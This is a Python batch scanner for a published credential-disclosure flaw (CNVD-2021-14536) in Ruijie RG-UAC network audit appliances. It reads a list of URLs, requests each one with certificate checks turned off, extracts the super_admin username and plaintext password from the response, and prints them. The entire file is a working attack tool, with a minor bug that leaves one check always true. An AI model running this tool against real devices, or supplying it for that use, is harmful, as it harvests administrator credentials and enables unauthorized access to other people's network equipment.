import requests
import re
import argparse
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'}

def title():
	print('锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露漏洞 CNVD-2021-14536')

def scan(url):
	r = requests.get(url=url, headers=headers, verify=False, timeout=10)
	try:
		if ("super_admin" in r.text) and ("password in r.text") and (r.status_code == 200):
			pattern = re.compile('"super_admin","name":"(.*?)","password":"(.*?)"', re.S)
			result = pattern.search(r.text)
			username = result.group(1)
			password = result.group(2)
			print('[+] {0} 存在信息泄露 {1}  {2}'.format(url, username, password))
		else:
			print('[-] {0} 不存在信息泄露'.format(url))
	except Exception as e:
		print('url:{0} 访问异常')

def file_path(file):
	for url in open(file, 'r', encoding='utf-8'):
		if url[:4] != "http":
			url = "http://" + url
		url = url.strip()
		# print(url)
		try:
			scan(url)
		except Exception as e:
			print("URL错误: {0}".format(url))
			# print(e)

def main():
	title()
	file = str(input('批量检测文件路径: ')).strip()
	file_path(file)


if __name__ == '__main__':
	main()